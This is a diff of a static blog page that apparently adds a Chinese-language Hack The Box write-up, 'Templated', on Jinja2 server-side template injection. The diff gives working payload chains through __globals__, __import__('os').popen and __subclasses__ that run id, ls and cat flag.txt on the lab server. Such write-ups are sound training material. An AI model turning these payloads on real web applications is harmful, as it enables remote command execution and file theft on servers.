@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/categories/tum课程笔记/era-计算机体系结构/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/03/27/ctf/web/htb-templated/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,18 +33,26 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Category: ERA 计算机体系结构 - Hexo</title>
-  <meta name="keywords" content="null">
+  <title>HTB Templated - Hexo</title>
+  <meta name="keywords" content="HTB,Web,Injection,Template Injection,模板注入,Jinja2,null">
   <meta desc name="description" content="hi - John Doe - Hexo">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Templated">
+<meta property="og:url" content="http://example.com/2025/03/27/CTF/Web/HTB-Templated/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="hi">
+<meta property="og:description" content="题目描述 （无附件） 观察打开网站会发现一片空白：  专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为 1{{ code }}  （以下用server来指代当前网址） 因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成 1server&#x2F;{{7*7}}  时，会显示  可以看到 7*7 确实被执行了，所以确定这里就是注入口。 渗透有至少2种方法： 第一种通过">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-03-27T20:02:53.000Z">
+<meta property="article:modified_time" content="2025-03-27T20:55:06.020Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Injection">
+<meta property="article:tag" content="Template Injection">
+<meta property="article:tag" content="模板注入">
+<meta property="article:tag" content="Jinja2">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2264,7 +2272,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2621,27 +2629,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/19/TUM笔记/ERA/RISC-V-汇编语言入门/">
+  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/27/CTF/Web/HTB-Templated/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2650,133 +2640,273 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="hi">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/03/19/TUM%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/"  itemprop="url">
-        RISC-V 汇编语言入门
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      计算机体系结构基础相关笔记
+    
+      <h1 class="title" itemprop="name headline">
+        HTB Templated
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+  
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/CTF/">CTF</a><span class="sep"></span><a class="category-link" href="/categories/CTF/Web/">Web</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
+        <a href="/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
+      </span>
+    
+      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
+        <a href="/categories/CTF/Web/" itemprop="url"><span itemprop="name">Web</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-03-19T20:56:10+01:00">2025-03-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">TUM课程笔记</a><span class="sep"></span><a class="category-link" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/">ERA 计算机体系结构</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">TUM课程笔记</span></a>
-            </span>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" itemprop="url"><span itemprop="name">ERA 计算机体系结构</span></a>
-            </span>
+
+
+
           
         
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/03/19/TUM%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
+          
+            
+  
+  
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HTB/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>HTB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Web/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Injection/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Injection</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Template-Injection/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Template Injection</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>模板注入</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Jinja2/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Jinja2</p></a></div>
+  <span hidden itemprop="keywords">HTB Web Injection Template Injection 模板注入 Jinja2</span>
   
 
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-27T21:55:06+01:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Mar 27, 2025</p>
+  </a>
 </div>
 
-          </div>
+          
         
-      
+        <!-- Custom Files topMeta begin-->
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/18/TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="hi">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/03/18/TUM%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/"  itemprop="url">
-        1 Einführung und Datenrepräsentation
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      计算机体系结构基础相关笔记
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h2><p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210424995.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210424995.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327210424995"></p>
+<p>（无附件）</p>
+<h2 id="观察"><a href="#观察" class="headerlink" title="观察"></a><strong>观察</strong></h2><p>打开网站会发现一片空白：</p>
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210509830.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210509830.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327210509830"></p>
+<p>专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ code }}</span><br></pre></td></tr></table></figure>
+
+<p>（以下用server来指代当前网址）</p>
+<p>因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server/{{7*7}}</span><br></pre></td></tr></table></figure>
+
+<p>时，会显示</p>
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210938904.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210938904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327210938904"></p>
+<p>可以看到 7*7 确实被执行了，所以确定这里就是注入口。</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>有至少2种方法：</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a><strong>第一种</strong></h3><p>通过模板中函数对象的 <kbd>__globals__</kbd>  拿到全局作用域，然后借助 <kbd>____builtins__[__import__]__</kbd>  导入 <kbd>os</kbd> ，用 <kbd>os.popen()</kbd> 执行命令。</p>
+<p>核心链路：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span></span><br><span class="line">↓</span><br><span class="line">__init__                        ← 模板函数对象</span><br><span class="line">↓</span><br><span class="line">__globals__                     ← 函数的全局变量字典</span><br><span class="line">↓</span><br><span class="line">__builtins__[<span class="string">'__import__'</span>]     ← 导入函数</span><br><span class="line">↓</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">'os'</span>)               ← 导入 os 模块</span><br><span class="line">↓</span><br><span class="line">os.popen(<span class="string">'命令'</span>).read()        ← 执行命令并读取结果</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按以下顺序注入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()}}</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ <span class="variable language_">self</span>.__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213648661.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213648661.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327213648661"></p>
+<p>确认了当前注入方式可行。</p>
+<p>然后查找 flag 文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'ls'</span>).read()}}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213726011.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213726011.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327213726011"></p>
+<p>最后直接读取flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ <span class="variable language_">self</span>.__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'cat flag.txt'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213803700.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213803700.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327213803700"></p>
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a><strong>第二种</strong></h3><p>使用这个模板来发起命令执行（RCE）攻击：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'id'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+<p>（需要找到popen对应的index）</p>
+<p>首先用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ [].__class__.__base__.__subclasses__() }}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214655263.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214655263.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327214655263"></p>
+<p>列出所有 subclasses，然后通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">{% for c in [].__class__.__base__.__subclasses__() %}</span><br><span class="line">  {% if 'Popen' in c.__name__ %}</span><br><span class="line">    {{ loop.index0 }}: {{ c }}</span><br><span class="line">  {% endif %}</span><br><span class="line">{% endfor %}</span><br></pre></td></tr></table></figure>
+
+<p>找到 <kbd>popen</kbd> 的index：</p>
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214855996.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214855996.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327214855996"></p>
+<p>通过尝试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ [].__class__.__base__.__subclasses__()[<span class="number">414</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'id'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215036879.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215036879.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327215036879"></p>
+<p>确认可以成功RCE。</p>
+<p>接着就跟之前一样先找然后再读取flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ [].__class__.__base__.__subclasses__()[<span class="number">414</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'ls'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215219651.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215219651.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327215219651"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{ [].__class__.__base__.__subclasses__()[<span class="number">414</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat flag.txt'</span>).read() }}</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215241749.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215241749.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250327215241749"></p>
+<p>拿到flag：<psw>HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}</psw> 。</p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-03-18T13:12:02+01:00">2025-03-18</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">TUM课程笔记</a><span class="sep"></span><a class="category-link" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/">ERA 计算机体系结构</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">TUM课程笔记</span></a>
-            </span>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" itemprop="url"><span itemprop="name">ERA 计算机体系结构</span></a>
-            </span>
-          
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/03/18/TUM%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-27T21:02:53+01:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Mar 27, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
-  </section>
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/27/CTF/Web/HTB-Templated/&title=HTB Templated - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/27/CTF/Web/HTB-Templated/&title=HTB Templated - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/27/CTF/Web/HTB-Templated/&title=HTB Templated - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
-    
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/03/27/CTF/Web/HTB-Spookifier/'>
+          <p class='title'>HTB Spookifier<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>题目描述
+（有附件）
+解题观察打开网站：
+
+输入 “abc“ 会看到：
+
+然后我们来查看代码（routes.py）：
+1234567891011121314from flask import B...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
   
 
 
-    
-  
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="https://schema.org.cn/WPSideBar">
   
@@ -2785,176 +2915,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box circle' href='/about/'>
-          <img no-lazy src='https://github.com/Lycorisby/pictures/raw/main/%E5%A3%81%E7%BA%B8/%E6%B4%BE%E5%A4%A7%E6%98%9F.jpeg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="mailto:aurora20000521@gmail.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/archer-baiyi"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/ACM/" href="/categories/ACM/"
-            active-action="action-categoriesACM"
-            ><div class='name'>ACM</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/ACM/Codeforce/" href="/categories/ACM/Codeforce/"
-            active-action="action-categoriesACMCodeforce"
-            ><div class='name'>Codeforce</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/ACM/Codeforce/1000/" href="/categories/ACM/Codeforce/1000/"
-            active-action="action-categoriesACMCodeforce1000"
-            ><div class='name'>1000</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/ACM/Codeforce/800/" href="/categories/ACM/Codeforce/800/"
-            active-action="action-categoriesACMCodeforce800"
-            ><div class='name'>800</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/CTF/" href="/categories/CTF/"
-            active-action="action-categoriesCTF"
-            ><div class='name'>CTF</div><div class='badge'>(9)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/CTF%E5%B0%8F%E7%9F%A5%E8%AF%86/" href="/categories/CTF/CTF%E5%B0%8F%E7%9F%A5%E8%AF%86/"
-            active-action="action-categoriesCTFCTFE5B08FE79FA5E8AF86"
-            ><div class='name'>CTF小知识</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/Reverse-Engineering/" href="/categories/CTF/Reverse-Engineering/"
-            active-action="action-categoriesCTFReverse-Engineering"
-            ><div class='name'>Reverse Engineering</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/Web/" href="/categories/CTF/Web/"
-            active-action="action-categoriesCTFWeb"
-            ><div class='name'>Web</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/writeup/" href="/categories/CTF/writeup/"
-            active-action="action-categoriesCTFwriteup"
-            ><div class='name'>writeup</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"
-            active-action="action-categoriesTUME8AFBEE7A88BE7AC94E8AEB0"
-            ><div class='name'>TUM课程笔记</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"
-            active-action="action-categoriesTUME8AFBEE7A88BE7AC94E8AEB0Dantenbank-E695B0E68DAEE5BA93"
-            ><div class='name'>Dantenbank 数据库</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" href="/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"
-            active-action="action-categoriesTUME8AFBEE7A88BE7AC94E8AEB0ERA-E8AEA1E7AE97E69CBAE4BD93E7B3BBE7BB93E69E84"
